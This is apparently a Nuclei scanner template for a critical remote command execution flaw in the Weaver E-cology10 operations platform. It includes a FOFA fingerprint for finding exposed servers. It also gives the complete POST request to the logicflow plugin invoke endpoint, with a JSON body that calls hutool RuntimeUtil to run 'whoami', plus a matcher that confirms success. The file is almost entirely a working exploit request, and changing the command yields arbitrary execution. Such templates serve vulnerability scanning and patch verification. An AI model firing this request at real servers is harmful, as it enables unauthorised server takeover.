id: FanWei-E-cology10-invoke-RCE

info:
  name: 泛微E-cology10 运维管理平台 /papi/openapi/sapi/oauth2/logicflow/plugin/invoke 远程命令执行
  author: HuanXiong
  severity: critical
  description: |-
    fofa: icon_hash="-1619753057"
    泛微E-cology10运维管理平台 /papi/openapi/sapi/oauth2/logicflow/plugin/invoke 接口存在远程命令执行漏洞，攻击者可以通过构造恶意的JSON请求调用RuntimeUtil类执行系统命令，从而获取服务器系统权限，造成严重的安全威胁。
  reference:
    - 
  tags: rce, weaver, ecology10

http:
  - raw:
      - |-
        POST /papi/openapi/sapi/oauth2/logicflow/plugin/invoke HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        S-Header: foreign
        Scheme: http
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
        Accept-Encoding: gzip
        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
        Connection: keep-alive
        Content-Length: 208

        {
        "className": "cn.hutool.core.util.RuntimeUtil",
        "methodName": "execForStr",
        "context": "local",
        "restParameterTypes": ["[Ljava.lang.String;"],
        "restArguments": [["whoami"]],
        "serializeType": "json"
        }

    matchers:
      - type: dsl
        name: 远程命令执行
        dsl:
          - "status_code == 200 && contains_all(body, '接口返回成功', 'code', '200', 'status', 'true')"